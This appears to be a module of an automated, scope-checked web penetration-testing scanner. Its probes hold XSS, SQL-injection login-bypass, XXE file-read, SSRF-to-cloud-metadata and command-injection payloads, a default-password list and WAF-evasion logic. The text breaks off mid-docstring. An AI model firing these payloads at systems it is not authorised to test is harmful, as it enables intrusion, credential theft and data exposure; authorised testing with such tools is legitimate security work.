"""Deep probe kit — v0.3 coverage layer: 24 more oracle-backed bug classes.

Groups:
  injection     hpp, nosql_injection, xpath_injection, ldap_injection, xxe,
                sqli_blind, cmd_timing, xss_ctx, open_redirect_bypass
  authz/logic   mass_assignment, negative_quantity, race_condition,
                account_enumeration, default_creds, reset_poison
  graphql       graphql_depth, graphql_batch, graphql_suggestions
  cache/web     cache_deception, cache_poisoning, clickjacking, cookie_audit,
                options_methods, debug_disclosure
  disclosure    backup_files, sourcemap_probe, apiversion_scan, ssrf_param

Every probe: ScopeGuard on every URL, Oracle verdict, byte-level Evidence.
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import httpx

from ..core.waf import PayloadMutator, WAFDetector, looks_blocked
from ..scope.guard import ScopeGuard
from .oracle import Evidence, Oracle, OracleVerdict
from .probes2 import ExtendedProbeKit
from .probes import ProbeOutput

_EVIL_HOST = "avci-evil.example"
_XSS_CTX_PAYLOADS = (
    '"><svg onload=alert(1)>',          # attribute breakout
    "'-alert(1)-'",                      # single-quoted js string
    "javascript:alert(1)//",             # href/src sink
    "</title><script>alert(1)</script>", # title context
    # slash-separated attributes survive whitespace-stripping filters;
    # image/svg execute handlers even where <script> is blacklisted
    "<image/src=x/onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<image src=x onerror=alert('XSS')>",
    "'><image/src/onerror=alert('XSS')//",
    # autofocus handlers fire with zero user interaction — what headless
    # XSS checkers (and bot reviewers) actually trigger
    "<input autofocus onfocus=alert('XSS')>",
    "<body onload=alert('XSS')>",
)
_REDIRECT_BYPASSES = (
    "//avci-redirect.evil.com", "\\/\\/avci-redirect.evil.com",
    "https:avci-redirect.evil.com", "/\\avci-redirect.evil.com",
    "%2F%2Favci-redirect.evil.com", "avci-redirect.evil.com",
    "https://target.avci-redirect.evil.com",
)
_NOSQL_SIGS = ["mongoerror", "mongod", "bson", "$err", "query failed",
               "no sql query", "unauthorized to access"]
_XPATH_SIGS = ["xpath", "xmlexception", "simplexmlelement",
               "invalid predicate", " XPathException"]
_LDAP_SIGS = ["ldap_search", "ldapexception", "invalid dn syntax",
              "bad search filter"]
_STACK_SIGS = ["Traceback (most recent call last)", "at java.",
               "org.apache.catalina", "Symfony", "Django Version",
               "DEBUG = True", "Microsoft .NET Framework", "at rails",
               "Warning:", "Fatal error:"]
# bounded classic-pair matrix — the usual pentest top-list (SecLists-style
# common demo creds), NOT a spray: ~24 requests, lockout-aborted.
_DEFAULT_TRIES = (
    ("admin", "admin"), ("admin", "password"), ("admin", "password123"),
    ("admin", "admin123"), ("admin", "123456"), ("admin", "P@ssw0rd"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("test", "test"), ("test", "1234"), ("test", "password"),
    ("user", "user"), ("user", "password"),
    ("guest", "guest"), ("guest", "password"),
    ("demo", "demo"), ("demo", "password"),
    ("john", "john"), ("john", "password123"),
    ("service", "service"), ("system", "system"),
    ("manager", "manager"), ("operator", "operator"),
)
_LOCKOUT_SIGS = ("locked", "too many attempts", "try again later",
                 "temporarily blocked")


def _login_accepted(r):
    """Session-marker read on a login response: redirect+Set-Cookie (not
    back to login) or a success marker in the body without error words."""
    sc = "set-cookie" in {k.lower() for k in r.headers}
    loc = (r.headers.get("location") or "").lower()
    if r.status_code in (301, 302, 303, 307, 308):
        if sc and ("login" not in loc and "signin" not in loc
                   or "dash" in loc or "home" in loc):
            return f"redirect -> {loc or '?'} with session cookie"
        return None
    if r.status_code == 200:
        low = r.text.lower()
        if any(m in low for m in ('"token"', '"session"', '"success"',
                                  '"response":"success"', "welcome",
                                  "dashboard", "logged in")) \
                and "invalid" not in low and "error" not in low:
            return "session marker in body"
    return None


# bounded SQLi auth-bypass pair battery: username satisfies/selects the row,
# password breaks the hash-check context (double-hash checks make extraction
# useless — the pair IS the exploit). ~12 requests, lockout-aborted.
_BYPASS_PAIRS = (
    ("admin", "' OR 1=1-- -"),
    ("admin", "'), 'x')) OR 1=1-- -"),
    ("admin", "') OR ('1'='1"),
    ("admin", "' or '1'='1"),
    ("' OR 1=1 LIMIT 1-- -", "avci-pad-1234"),
    ("' OR 1=1-- -", "avci-pad-1234"),
    ("' OR username='admin'-- -", "avci-pad-1234"),
    ("' OR 1=1 LIMIT 1-- -", "' OR 1=1-- -"),
    ("admin'-- -", "avci-pad-1234"),
    ("admin' #", "avci-pad-1234"),
    ("' OR 1=1 LIMIT 1-- -", "'), 'x')) OR 1=1-- -"),
    ("admin", "x' OR 1=1-- -"),
)


def _set_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))


def _dup_param(url: str, param: str, a: str, b: str) -> str:
    parts = urlsplit(url)
    keep = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
            if k != param]
    qs = urlencode(keep + [(param, a), (param, b)])
    return urlunsplit((parts.scheme, parts.netloc, parts.path, qs, ""))


class DeepProbeKit(ExtendedProbeKit):
    """v0.3 layer. Constructor takes an optional OOB manager handle for
    ssrf_param / xxe blind confirmation."""

    def __init__(self, guard: ScopeGuard, oracle: Oracle | None = None,
                 oob=None) -> None:
        super().__init__(guard, oracle)
        self.oob = oob
        self.waf = WAFDetector()
        self.mutator = PayloadMutator()

    # -- WAF-aware GET: on a blocked status retry once with mutations ------
    async def _get_war(self, url: str):
        r = await self._get(url)
        if looks_blocked(r.status_code):
            host = httpx.URL(url).host
            fam = self.waf.fingerprint(host, r.status_code,
                                       dict(r.headers), r.text[:500])
            if fam:
                parts = urlsplit(url)
                q = [(k, v) for k, v in parse_qsl(parts.query,
                                                  keep_blank_values=True)]
                for level in (1, 2):
                    variant_qs = urlencode(
                        [(k, v if i else self.mutator.mutate(v, level)[0])
                         for i, (k, v) in enumerate(q)])
                    t = urlunsplit((parts.scheme, parts.netloc, parts.path,
                                    variant_qs, ""))
                    r2 = await self._get(t)
                    if not looks_blocked(r2.status_code):
                        r2.request_note = f"waf={fam} level={level} bypassed"  # type: ignore[attr-defined]
                        return r2
                    r = r2
        return r

    # ====================================================================
    # injection group
    # ====================================================================
    async def hpp(self, url: str, param: str) -> ProbeOutput:
        """HTTP parameter pollution: duplicate the param; server-side
        concatenation ('a,b') is the classic HPP tell."""
        t = _dup_param(url, param, "avcihppA", "avcihppB")
        r = await self._get(t)
        joined = ("avcihppA,avcihppB" in r.text
                  or "avcihppA, avcihppB" in r.text
                  or "avcihppAavcihppB" in r.text)
        v = OracleVerdict("HTTP parameter pollution",
                          "CONFIRMED" if joined else "FAILED",
                          [{"check": "values joined server-side", "pass": joined}],
                          "both values processed and concatenated"
                          if joined else "last/first-wins only (no concat)")
        return ProbeOutput("hpp", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r.status_code,
            response_excerpt=r.text[:300]))

    # --------------------------------------------------------------------
    async def nosql_injection(self, url: str, param: str) -> ProbeOutput:
        base = _set_param(url, param, "avcinosql")
        r0 = await self._get_war(base)
        t = _set_param(url, param, "avcinosql' || '1'=='1")
        r1 = await self._get_war(t)
        v = self.oracle.judge_differential(
            "NoSQL injection", r0.status_code, len(r0.content),
            r1.status_code, len(r1.content), sigs=_NOSQL_SIGS, body_b=r1.text)
        return ProbeOutput("nosql_injection", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r1.status_code,
            response_excerpt=r1.text[:400]))

    # --------------------------------------------------------------------
    async def xpath_injection(self, url: str, param: str) -> ProbeOutput:
        base = _set_param(url, param, "avcixpath")
        r0 = await self._get_war(base)
        t = _set_param(url, param, "avci' or '1'='1")
        r1 = await self._get_war(t)
        v = self.oracle.judge_differential(
            "XPath injection", r0.status_code, len(r0.content),
            r1.status_code, len(r1.content), sigs=_XPATH_SIGS, body_b=r1.text)
        return ProbeOutput("xpath_injection", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r1.status_code,
            response_excerpt=r1.text[:400]))

    # --------------------------------------------------------------------
    async def ldap_injection(self, url: str, param: str) -> ProbeOutput:
        base = _set_param(url, param, "avcildap")
        r0 = await self._get_war(base)
        t = _set_param(url, param, "*)(uid=*))(|(uid=*")
        r1 = await self._get_war(t)
        v = self.oracle.judge_differential(
            "LDAP injection", r0.status_code, len(r0.content),
            r1.status_code, len(r1.content), sigs=_LDAP_SIGS, body_b=r1.text)
        return ProbeOutput("ldap_injection", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r1.status_code,
            response_excerpt=r1.text[:400]))

    # --------------------------------------------------------------------
    async def _sqli_blind_form(self, url: str,
                               param: str = "") -> ProbeOutput | None:
        """POST-borne blind SQLi on the in-scope forms behind url.
        String-context payloads (quoted WHERE legs): tautology/
        contradiction differential, then one SLEEP shot per field,
        against a benign baseline POST."""
        forms = await self._forms_of(url)
        if not forms:
            return None
        skip = {"submit", "go", "send", "button", "search", "csrf",
                "_token", "token", "captcha", "g-recaptcha-response"}
        from .probes import _benign_value
        for action, fields in forms[:2]:
            targets = [f for f in fields if f.lower() not in skip]
            if param:
                targets = [f for f in fields if f == param] or targets
            benign = {f: _benign_value(f) for f in fields}
            self.guard.check_url(action)
            try:
                await self._client.post(action, data=benign)
            except Exception:  # noqa: BLE001
                continue
            for f in targets[:4]:
                # boolean pair
                data_t = dict(benign)
                data_t[f] = str(data_t.get(f, "")) + "' OR 1=1-- -"
                data_f = dict(benign)
                data_f[f] = str(data_f.get(f, "")) + "' OR 1=2-- -"
                try:
                    rt = await self._client.post(action, data=data_t)
                    rf = await self._client.post(action, data=data_f)
                except Exception:  # noqa: BLE001
                    continue
                v = self.oracle.judge_differential(
                    "Blind SQLi (boolean, form)", rt.status_code,
                    len(rt.content), rf.status_code, len(rf.content))
                if v.ok:
                    return ProbeOutput("sqli_blind", action, v, Evidence(
                        request=self._req_repr("POST", action) +
                        f"\n[{f}] = {data_t[f][:60]}",
                        response_status=rt.status_code,
                        response_excerpt=rt.text[:300]),
                        note=f"form field '{f}' tautology/contradiction")
                # one time-based shot
                data_s = dict(benign)
                data_s[f] = str(data_s.get(f, "")) + "' AND SLEEP(5)-- -"
                t0 = time.monotonic()
                try:
                    rs = await self._client.post(action, data=data_s)
                except Exception:  # noqa: BLE001
                    continue
                elapsed = time.monotonic() - t0
                v = self.oracle.judge_timing("Blind SQLi (time-based, form)",
                                             elapsed, 3.0, "SLEEP(5)")
                if v.ok:
                    return ProbeOutput("sqli_blind", action, v, Evidence(
                        request=self._req_repr("POST", action) +
                        f"\n[{f}] = {data_s[f][:60]}",
                        response_status=rs.status_code,
                        response_excerpt=f"elapsed={elapsed:.1f}s"),
                        note=f"form field '{f}' SLEEP")
        return ProbeOutput("sqli_blind", url, OracleVerdict(
            "Blind SQLi (form)", "FAILED", [],
            "no boolean/time oracle reacted on any form field"),
            Evidence(request="POST " + url))

    # --------------------------------------------------------------------
    async def sqli_blind(self, url: str, param: str = "") -> ProbeOutput:
        """Boolean + time oracles, one bounded request each. Form URLs
        (paramless or no query string) get a POST battery: tautology vs
        contradiction vs SLEEP into each form field."""
        from urllib.parse import urlsplit
        if not param or not urlsplit(url).query:
            out = await self._sqli_blind_form(url, param)
            if out is not None:
                return out
            if not param:
                return ProbeOutput("sqli_blind", url, OracleVerdict(
                    "Blind SQLi", "FAILED", [],
                    "no form found behind this URL — name a query param or "
                    "pass the page that carries the form"), Evidence())
        base = _set_param(url, param, "1")
        r_t = await self._get_war(_set_param(url, param, "1 AND 1=1"))
        r_f = await self._get_war(_set_param(url, param, "1 AND 1=2"))
        v = self.oracle.judge_differential(
            "Blind SQLi (boolean)", r_t.status_code, len(r_t.content),
            r_f.status_code, len(r_f.content))
        if not v.ok:  # fall through to a single time-based shot
            t = _set_param(url, param, "1 AND SLEEP(5)")
            t0 = time.monotonic()
            r = await self._get_war(t)
            elapsed = time.monotonic() - t0
            v = self.oracle.judge_timing("Blind SQLi (time-based)", elapsed,
                                         3.0, "SLEEP(5)")
            ev = Evidence(request=self._req_repr("GET", t),
                          response_status=r.status_code,
                          response_excerpt=f"elapsed={elapsed:.1f}s")
            return ProbeOutput("sqli_blind", t, v, ev)
        return ProbeOutput("sqli_blind", base, v, Evidence(
            request=self._req_repr("GET", _set_param(url, param, "1 AND 1=1")),
            response_status=r_t.status_code, response_excerpt=r_t.text[:300]))

    # --------------------------------------------------------------------
    async def cmd_timing(self, url: str, param: str) -> ProbeOutput:
        """Time-based command injection: one sleep payload, one control."""
        t = _set_param(url, param, "avci;sleep 6")
        t0 = time.monotonic()
        r = await self._get_war(t)
        elapsed = time.monotonic() - t0
        c0 = time.monotonic()
        await self._get_war(_set_param(url, param, "avci"))
        baseline = time.monotonic() - c0
        v = self.oracle.judge_timing("Blind command injection", elapsed,
                                     max(3.5, baseline + 3),
                                     ";sleep 6")
        return ProbeOutput("cmd_timing", t, v, Evidence(
            request=self._req_repr("GET", t), response_status=r.status_code,
            response_excerpt=f"payload={elapsed:.1f}s control={baseline:.1f}s"))

    # --------------------------------------------------------------------
    async def xss_ctx(self, url: str, param: str) -> ProbeOutput:
        """Context-aware XSS: try breakout variants per sink type."""
        best = None
        for payload in _XSS_CTX_PAYLOADS:
            t = _set_param(url, param, payload)
            r = await self._get_war(t)
            v = self.oracle.judge_reflection(payload, r.text,
                                             context_breakers=True)
            if v.ok:
                return ProbeOutput("xss_ctx", t, v, Evidence(
                    request=self._req_repr("GET", t),
                    response_status=r.status_code,
                    response_excerpt=r.text[:400]))
            if best is None or v.verdict == "PENDING":
                best = (t, v, r.status_code)
        t2, v2, st = best or (url, OracleVerdict(
            "XSS context breakout", "FAILED", [], "no reflection"), 0)
        return ProbeOutput("xss_ctx", t2, v2, Evidence(
            request=self._req_repr("GET", t2), response_status=st))

    # --------------------------------------------------------------------
    async def open_redirect_bypass(self, url: str, param: str) -> ProbeOutput:
        """Filters usually block https://evil — try //, \\/, https:, %2F%2F."""
        for payload in _REDIRECT_BYPASSES:
            t = _set_param(url, param, payload)
            r = await self._get(t)
            loc = r.headers.get("location", "")
            v = self.oracle.judge_redirect(t, loc)
            if v.ok:
                return ProbeOutput("open_redirect_bypass", t, v, Evidence(
                    request=self._req_repr("GET", t),
                    response_status=r.status_code, response_excerpt=loc))
        failed = OracleVerdict("Open redirect (bypass variants)", "FAILED", [],
                               "no variant redirected externally")
        return ProbeOutput("open_redirect_bypass", url, failed, Evidence())

    # --------------------------------------------------------------------
    async def _wsdl_wrappers(self, url: str) -> list[tuple[str, str]]:
        """SOAP services reject unknown envelopes ('Unknown request') but
        echo schema-typed fields back — read the service's own WSDL and
        return (root_element, child_field) candidates to wrap entities in."""
        out: list[tuple[str, str]] = []
        parts = urlsplit(url)
        for cand in (urlunsplit(parts._replace(path="/wsdl", query="")),
                     urlunsplit(parts._replace(path="/", query=""))
                     + "?wsdl", url + "?wsdl"):
            try:
                r = await self._client.get(cand)
                if "<definitions" not in r.text[:2000].lower() \
                        and "xsd" not in r.text.lower():
                    continue
                roots = re.findall(r'name=["\']([\w.:-]*?Request)["\']',
                                   r.text) or re.findall(
                    r'name=["\']([\w.:-]*?Input)["\']', r.text)
                kids = [k for k in re.findall(
                    r'<xsd:element[^>]+name=["\'](\w+)["\']', r.text)
                    if not k.endswith(("Request", "Input", "Response"))]
                for rt in dict.fromkeys(roots):
                    for kd in (dict.fromkeys(kids) or [""]):
                        out.append((rt, kd))
                        if len(out) >= 6:
                            return out
            except Exception:  # noqa: BLE001
                continue
        return out

    async def xxe(self, url: str, param: str, template: str = "") \
            -> ProbeOutput:
        """XML injection: external entity → local file (win.ini/passwd
        signature) and, when an OOB handle exists, a blind DTD callback.
        template= the service's own XML shape (from inline JS, docs, a
        readable WSDL): the entity is injected into its first text node so
        the resolved content is echoed back. WSDL-aware fallback wraps the
        entity in schema-declared request elements."""
        files = ("file:///c:/windows/win.ini", "file:///etc/passwd")
        sigs = ("[fonts]", "for 16-bit", "[extensions]")
        plant = None
        if self.oob is not None:
            try:
                ch = await self.oob.create()
                plant = ch.plant_url
            except Exception:  # noqa: BLE001
                pass
        self.guard.check_url(url)

        def _doc(target: str, root: str = "r", kid: str = "") -> str:
            inner = f"<{kid}>&xxe;</{kid}>" if kid else "&xxe;"
            return (f'<?xml version="1.0"?><!DOCTYPE {root} '
                    f'[<!ENTITY xxe SYSTEM "{target}">]>'
                    f"<{root}>{inner}</{root}>")

        candidates: list[tuple[str, str]] = []
        if template:
            decl, rest = ("", template.lstrip())
            if rest.startswith("<?xml"):
                nl = rest.find("?>")
                decl, rest = rest[:nl + 2], rest[nl + 2:]
            mt = re.search(r"<([A-Za-z_][\w.:-]*)", rest)
            for f in files:
                body_t, nsub = re.subn(
                    r"(<[\w.:-]+[^<>]*>)(\s*[^\s<][^<]{0,199}?)(</[\w.:-]+>)",
                    r"\1&xxe;\3", rest, count=1)
                if nsub:
                    ent = (f'<!DOCTYPE {mt.group(1)} '
                           f'[<!ENTITY xxe SYSTEM "{f}">]>')
                    candidates.append((decl + ent + body_t,
                                       f"template entity ({mt.group(1)})"))
        candidates += [
            (_doc(plant or files[0]), "blind OOB plant" if plant else "fixed"),
            (_doc(files[1]), "fixed"),
        ]
        for rt, kd in await self._wsdl_wrappers(url):
            for f in files:
                candidates.append((_doc(f, rt, kd), f"wsdl-wrapped {rt}"))

        for body, kind in candidates:
            r = await self._client.post(url, content=body,
                                        headers={"Content-Type":
                                                 "application/xml"})
            if any(s in r.text for s in sigs) or "root:" in r.text[:500]:
                v = OracleVerdict("XXE", "CONFIRMED",
                                  [{"check": "entity content in response",
                                    "pass": True}],
                                  f"external entity resolved to file "
                                  f"content ({kind})")
                return ProbeOutput("xxe", url, v, Evidence(
                    request=self._req_repr("POST", url) + "\n" + body[:200],
                    response_status=r.status_code,
                    response_excerpt=r.text[:300]))
        v = OracleVerdict("XXE", "PENDING" if plant else "FAILED", [],
                          f"blind payload planted at {plant} — oob_poll will "
                          "confirm" if plant else "no entity resolution")
        return ProbeOutput("xxe", url, v, Evidence(
            request=self._req_repr("POST", url),
            response_status=r.status_code if r else 0))

    # --------------------------------------------------------------------
    async def ssrf_param(self, url: str, param: str) -> ProbeOutput:
        """URL-accepting parameter: (a) cloud metadata attempt — response
        containing instance metadata is instant critical; (b) OOB plant."""
        findings: list[str] = []
        meta = _set_param(url, param, "http://169.254.169.254/latest/meta-data/")
        r = await self._get_war(meta)
        if re.search(r"ami-\w+|instance-id|iam/security-credentials", r.text):
            v = OracleVerdict("SSRF → cloud metadata", "CONFIRMED",
                              [{"check": "metadata body returned", "pass": True}],
                              "instance metadata reachable via parameter")
            return ProbeOutput("ssrf_param", meta, v, Evidence(
                request=self._req_repr("GET", meta),
                response_status=r.status_code, response_excerpt=r.text[:300]))
        plant = None
        if self.oob is not None:
            try:
                ch = await self.oob.create()
                plant = ch.plant_url
                await self._get_war(_set_param(url, param, plant))
                findings.append(f"planted {plant}")
            except Exception:  # noqa: BLE001
                pass
        v = OracleVerdict("SSRF (param)", "PENDING" if plant else "FAILED",
                          [{"check": "oob payload planted", "pass": bool(plant)}],
                          f"poll via oob_poll — {plant}" if plant
                          else "no metadata markers, no OOB channel")
        return ProbeOutput("ssrf_param", url, v, Evidence(
            request=self._req_repr("GET", meta), response_status=r.status_code,
            response_excerpt="; ".join(findings) or "no callback yet"))

    # ====================================================================
    # authz / business-logic group
    # ====================================================================
    async def mass_assignment(self, url: str,
                              fields: dict | None = None) -> ProbeOutput:
        """POST/PATCH the endpoint with elevation fields; the server echoing
        them back (or a later role change) is the receipt."""
        body = fields or {"role": "admin", "is_admin": True, "admin": True}
        self.guard.check_url(url)
        r = await self._client.patch(url, json=body,
                                     headers={"Content-Type": "application/json"})
        echoed = any(str(val).lower() in r.text.lower()
                     for val in body.values()) and any(
            k in r.text for k in body.keys())
        v = OracleVerdict("Mass assignment",
                          "CONFIRMED" if echoed else "FAILED",
                          [{"check": "elevation fields accepted+echoed",
                            "pass": echoed}],
                          "server accepted role/is_admin in body"
                          if echoed else "fields rejected or ignored")
        return ProbeOutput("mass_assignment", url, v, Evidence(
            request=self._req_repr("PATCH", url) + "\n" + json.dumps(body),
            response_status=r.status_code, response_excerpt=r.text[:300]))

    # --------------------------------------------------------------------
    async def negative_quantity(self, url: str,
                                body: dict | None = None) -> ProbeOutput:
        body = body or {"quantity": -3, "qty": -3, "amount": -3}
        self.guard.check_url(url)
        r = await self._client.post(url, json=body,
                                    headers={"Content-Type": "application/json"})
        neg_total = bool(re.search(
            r'"(?:total|price|sum|amount)"\s*:\s*-\d', r.text))
        v = OracleVerdict("Negative quantity / price tampering",
                          "CONFIRMED" if neg_total else "FAILED",
                          [{"check": "negative total accepted", "pass": neg_total}],
                          "server computed a negative total from -3 qty"
                          if neg_total else "no negative math observed")
        return ProbeOutput("negative_quantity", url, v, Evidence(
            request=self._req_repr("POST", url) + "\n" + json.dumps(body),
            response_status=r.status_code, response_excerpt=r.text[:300]))

    # --------------------------------------------------------------------
    async def race_condition(self, url: str, body: dict | None = None,
                             n: int = 8) -> ProbeOutput:
        """N identical concurrent requests; divergent statuses = TOCTOU tell.
        Single burst, bounded — this is detection, not DoS."""
        self.guard.check_url(url)
        if body is not None:
            reqs = [self._client.post(url, json=body) for _ in range(n)]
        else:
            reqs = [self._client.get(url) for _ in range(n)]
        rs = await asyncio.gather(*reqs, return_exceptions=True)
        statuses, bodies = [], []
        for r in rs:
            if isinstance(r, Exception):
                statuses.append(0)
            else:
                statuses.append(r.status_code)
                bodies.append(r.text[:400])
        v = self.oracle.judge_race(statuses, bodies)
        return ProbeOutput("race_condition", url, v, Evidence(
            request=self._req_repr("POST" if body else "GET", url) + f" x{n} concurrent",
            response_excerpt=json.dumps(statuses)))

    # --------------------------------------------------------------------
    async def account_enumeration(self, url: str, param: str) -> ProbeOutput:
        """Login/register/forgot: valid-format vs random username →
        differential response = enumeration oracle."""
        self.guard.check_url(url)
        known = {"username": "admin", "email": "admin@example.com",
                 "user": "admin", param: "admin"}
        a = await self._client.post(url, json={param: known.get(param, "admin"),
                                               "password": "avci-wrong-1"})
        b = await self._client.post(url, json={param: "avci-random-zz9x",
                                               "password": "avci-wrong-1"})
        v = self.oracle.judge_differential(
            "Account enumeration", a.status_code, len(a.content),
            b.status_code, len(b.content),
            sigs=["no such", "not found", "does not exist", "invalid username",
                  "already registered", "is taken"], body_b=b.text + a.text)
        return ProbeOutput("account_enumeration", url, v, Evidence(
            request=self._req_repr("POST", url) + f"\n{{'{param}': 'admin', "
            "'password': 'avci-wrong-1'}",
            response_status=b.status_code,
            response_excerpt=f"known={a.status_code}/{len(a.content)}B "
                             f"unknown={b.status_code}/{len(b.content)}B"))

    # --------------------------------------------------------------------
    async def default_creds(self, url: str) -> ProbeOutput:
        """Bounded: classic-pair matrix against the login form's OWN field
        names and encoding (form-native first, JSON fallback — a JSON body
        against a form endpoint just 500s), abort on lockout signals.
        Never a spray."""
        self.guard.check_url(url)
        # learn the real field names when the page carries a login form
        user_f, pass_f, enc = "username", "password", None  # None = sniff
        try:
            page = await self._client.get(url)
            mform = re.search(r"<form[^>]*>(.*?)</form>",
                              page.text, re.S | re.I)
            if mform:
                fb = mform.group(1)
                mpw = re.search(
                    r"<input[^>]*?(?:type=[\"']password[\"'][^>]*?"
                    r"name=[\"']([^\"']+)[\"']|name=[\"']([^\"']+)[\"']"
                    r"[^>]*?type=[\"']password[\"'])", fb, re.I)
                if mpw:
                    pass_f = mpw.group(1) or mpw.group(2)
                mu = re.search(
                    r"<input[^>]*?(?:type=[\"'](?:text|email)[\"'][^>]*?"
                    r"name=[\"']([^\"']+)[\"']|name=[\"']([^\"']+)[\"']"
                    r"[^>]*?type=[\"'](?:text|email)[\"'])", fb, re.I)
                if mu:
                    user_f = mu.group(1) or mu.group(2)
                enc = "form"
        except Exception:  # noqa: BLE001
            pass

        def _accepted(r: httpx.Response) -> str | None:
            # headers, not body: Set-Cookie is a response HEADER
            sc = "set-cookie" in {k.lower() for k in r.headers}
            loc = (r.headers.get("location") or "").lower()
            if r.status_code in (301, 302, 303, 307, 308):
                if sc and ("login" not in loc and "signin" not in loc
                           or "dash" in loc or "home" in loc):
                    return f"redirect -> {loc or '?'} with session cookie"
                return None
            if r.status_code == 200:
                low = r.text.lower()
                if any(m in low for m in ('"token"', '"session"',
                                          '"success"', "welcome",
                                          "dashboard", "logged in")) \
                        and "invalid" not in low and "error" not in low:
                    return "session marker in body"
            return None

        for user, pw in _DEFAULT_TRIES:
            if enc == "form":
                r = await self._client.post(url, data={user_f: user,
                                                       pass_f: pw})
            else:
                r = await self._client.post(url, json={user_f: user,
                                                       pass_f: pw,
                                                       "email": user})
                if r.status_code == 415:  # JSON not understood here
                    enc = "form"
                    r = await self._client.post(url, data={user_f: user,
                                                           pass_f: pw})
            low = r.text.lower()
            if any(s in low for s in _LOCKOUT_SIGS) or r.status_code == 429:
                v = OracleVerdict("Default credentials", "FAILED", [],
                                  "lockout signal — aborting immediately")
                return ProbeOutput("default_creds", url, v, Evidence(
                    request=self._req_repr("POST", url),
                    response_status=r.status_code,
                    response_excerpt=r.text[:200]))
            why = _accepted(r)
            if why:
                v = OracleVerdict("Default credentials", "CONFIRMED",
                                  [{"check": f"{user}:{pw} accepted",
                                    "pass": True}],
                                  f"{user}/{pw} logged in ({why}; fields "
                                  f"{user_f}/{pass_f}) — re-login with "
                                  "these via the http tool to carry the "
                                  "session forward")
                return ProbeOutput("default_creds", url, v, Evidence(
                    request=self._req_repr("POST", url) +
                    f"\n{user_f}={user}&{pass_f}={pw}",
                    response_status=r.status_code,
                    response_excerpt=r.text[:200]))
        v = OracleVerdict("Default credentials", "FAILED", [],
                          "classic pairs rejected")
        return ProbeOutput("default_creds", url, v, Evidence(
            request=self._req_repr("POST", url), response_status=401))

    # --------------------------------------------------------------------
    async def login_sqli_bypass(self, url: str) -> ProbeOutput:
        """Mechanical SQLi auth-bypass battery for a form login. When SQLi
        is confirmed on a login but the hash check makes extraction useless
        (double-hashed / preimage-impossible), the ONLY login path is an
        exact (username, password) payload pair: username satisfies the row
        selection, password breaks out of the hash-check context. Fires the
        bounded pair matrix against the form's own field names; judges by
        session markers. Never a spray; lockout-aborted."""
        self.guard.check_url(url)
        user_f, pass_f, enc = "username", "password", None  # None = sniff
        base: dict = {}  # hidden fields (+values) + submit button
        try:
            page = await self._client.get(url)
            mform = re.search(r"<form[^>]*>(.*?)</form>",
                              page.text, re.S | re.I)
            if mform:
                fb = mform.group(1)
                mpw = re.search(
                    r"<input[^>]*?(?:type=[\"']password[\"'][^>]*?"
                    r"name=[\"']([^\"]+)[\"']|name=[\"']([^\"]+)[\"']"
                    r"[^>]*?type=[\"']password[\"'])", fb, re.I)
                if mpw:
                    pass_f = mpw.group(1) or mpw.group(2)
                mu = re.search(
                    r"<input[^>]*?(?:type=[\"'](?:text|email)[\"\'][^>]*?"
                    r"name=[\"']([^\"]+)[\"']|name=[\"']([^\"]+)[\"']"
                    r"[^>]*?type=[\"'](?:text|email)[\"'])", fb, re.I)
                if mu:
                    user_f = mu.group(1) or mu.group(2)
                enc = "form"
                # form-native completeness: hidden inputs carry their value
                # (CSRF etc.) and the submit button gates isset($_POST[...])
                # in PHP — omit them and the app ignores the POST entirely.
                for tag in re.findall(r"<input[^>]*>", fb, re.I):
                    t = tag.lower()
                    mn = re.search(r"name=[\"']([^\"]+)[\"']", tag, re.I)
                    if not mn:
                        continue
                    mv = re.search(r"value=[\"']([^\"]*)[\"']", tag, re.I)
                    nm, vl = mn.group(1), (mv.group(1) if mv else "")
                    if nm in (user_f, pass_f):
                        continue
                    if "type=[\"hidden" in t.replace("'", '"'):
                        base[nm] = vl
                    elif ("type=[\"submit" in t.replace("'", '"')
                          or "type=[\"button" in t.replace("'", '"')):
                        base.setdefault(nm, vl or nm)
                # PHP apps commonly gate on isset($_POST['submit']) even when
                # their own submit button carries no name attribute — without
                # the key the POST is silently ignored and the form re-renders.
                base.setdefault("submit", "submit")
        except Exception:  # noqa: BLE001
            pass

        for user, pw in _BYPASS_PAIRS:
            data = {**base, user_f: user, pass_f: pw}
            if enc == "form":
                r = await self._client.post(url, data=data)
            else:
                r = await self._client.post(url, json={user_f: user,
                                                       pass_f: pw})
                if r.status_code == 415:
                    enc = "form"
                    r = await self._client.post(url, data=data)
            low = r.text.lower()
            if any(s in low for s in _LOCKOUT_SIGS) or r.status_code == 429:
                v = OracleVerdict("Login SQLi bypass", "FAILED", [],
                                  "lockout signal — aborting immediately")
                return ProbeOutput("login_sqli_bypass", url, v, Evidence(
                    request=self._req_repr("POST", url),
                    response_status=r.status_code,
                    response_excerpt=r.text[:200]))
            why = _login_accepted(r)
            if why:
                v = OracleVerdict("Login SQLi bypass", "CONFIRMED",
                                  [{"check": f"pair accepted: {user!r} / {pw!r}",
                                    "pass": True}],
                                  f"auth bypassed with pair ({user_f}={user!r}, "
                                  f"{pass_f}={pw!r}) via {why} — re-POST this "
                                  "exact pair with the http tool to carry the "
                                  "session, then hit the authenticated surface "
                                  "(upload/profile/admin)")
                return ProbeOutput("login_sqli_bypass", url, v, Evidence(
                    request=self._req_repr("POST", url) +
                    f"\n{user_f}={user}&{pass_f}={pw}",
                    response_status=r.status_code,
                    response_excerpt=r.text[:200]))
        v = OracleVerdict("Login SQLi bypass", "FAILED", [],
                          "bypass pair matrix rejected")
        return ProbeOutput("login_sqli_bypass", url, v, Evidence(
            request=self._req_repr("POST", url), response_status=401))

    # --------------------------------------------------------------------
    async def reset_poison(self, url: str, email_field: str = "email",
                           poison_header: str = "X-Forwarded-Host") -> ProbeOutput:
        """Password-reset poisoning, self-contained: temp inbox → register →
        request reset with poisoned host header → poll inbox. A reset link
